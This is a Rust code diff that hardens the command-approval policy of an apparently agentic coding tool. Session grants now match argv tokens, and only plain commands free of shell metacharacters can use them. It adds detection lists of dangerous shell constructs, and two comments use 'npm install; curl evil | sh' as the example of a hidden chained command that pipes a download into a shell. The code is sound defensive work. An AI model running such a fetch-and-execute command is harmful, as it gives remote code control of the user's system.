@@ -51,7 +51,7 @@ pub struct Policy {
     protected: Vec<String>,
     writable_roots: Vec<PathBuf>,
     grants: Vec<PathBuf>,
-    bash_grants: Vec<String>,
+    bash_grants: Vec<Vec<String>>,
     rules: Vec<BashRule>,
     network: bool,
 }
@@ -218,10 +218,13 @@ impl Policy {
             .map_err(|_| PolicyError::InvalidPath(dir.to_path_buf()))
     }
 
-    /// Grant a bash command prefix for the rest of the session.
-    /// Commands starting with this prefix are allowed without asking.
-    pub fn approve_prefix(&mut self, prefix: &str) {
-        self.bash_grants.push(prefix.to_string());
+    /// Grant a bash command prefix for the rest of the session (PLAN 6.1.3:
+    /// the first two argv tokens of the approved command). The prefix is
+    /// compared token by token, and only against commands that are a single
+    /// plain command, so an approval for `npm install` cannot be reused for
+    /// `npm install; curl evil | sh`.
+    pub fn approve_prefix(&mut self, argv_prefix: Vec<String>) {
+        self.bash_grants.push(argv_prefix);
     }
 
     /// Session working directory.
@@ -297,22 +300,10 @@ impl Policy {
             }
         }
 
-        // 2. Session grants: commands matching a granted prefix are allowed.
-        for grant in &self.bash_grants {
-            if command.starts_with(grant) {
-                return (Decision::Allow, Some(format!("grant: {grant}")));
-            }
-        }
-
-        // 3. Configured rules (exact match on `match` field)
-        for rule in &self.rules {
-            if command == rule.r#match {
-                return (rule.decision.clone(), Some(rule.id.clone()));
-            }
-        }
-
-        // 3. Dangerous shell constructs → Ask
-        let dangerous = ["$(", "`", ">", ">>", "-delete"];
+        // 2. Dangerous shell constructs → Ask. Checked before any grant: an
+        //    approval is for one plain command, never for a substitution that
+        //    hides a second command.
+        let dangerous = ["$(", "`", ">", ">>", "-delete", "\n"];
         for &pattern in &dangerous {
             if command.contains(pattern) {
                 return (
@@ -324,7 +315,24 @@ impl Policy {
             }
         }
 
-        // 4. Split by && || ; and check each segment against allow rules
+        // 3. Session grants: a plain command whose argv starts with a granted
+        //    prefix. Token comparison, not string prefixes.
+        if let Some(argv) = plain_argv(command) {
+            for grant in &self.bash_grants {
+                if argv.len() >= grant.len() && argv[..grant.len()] == grant[..] {
+                    return (Decision::Allow, Some(format!("grant: {}", grant.join(" "))));
+                }
+            }
+        }
+
+        // 4. Configured rules (exact match on `match` field)
+        for rule in &self.rules {
+            if command == rule.r#match {
+                return (rule.decision.clone(), Some(rule.id.clone()));
+            }
+        }
+
+        // 5. Split by && || ; and check each segment against allow rules
         let segments: Vec<&str> = command
             .split(&['&', '|', ';'][..])
             .map(|s| s.trim())
@@ -385,6 +393,26 @@ impl Policy {
         }
 
         (Decision::Allow, None)
+    }
+}
+
+/// The argv of a command that is a single plain command, or `None` when the
+/// command contains shell syntax that could chain, expand or redirect.
+///
+/// A session grant is only ever matched against this form, so approving
+/// `npm install` never approves `npm install; curl evil | sh`.
+fn plain_argv(command: &str) -> Option<Vec<&str>> {
+    const META: &[char] = &[
+        ';', '|', '&', '>', '<', '$', '`', '(', ')', '{', '}', '\n', '\r', '*', '?', '~', '!',
+    ];
+    if command.chars().any(|c| META.contains(&c)) {
+        return None;
+    }
+    let argv: Vec<&str> = command.split_whitespace().collect();
+    if argv.is_empty() {
+        None
+    } else {
+        Some(argv)
     }
 }
 
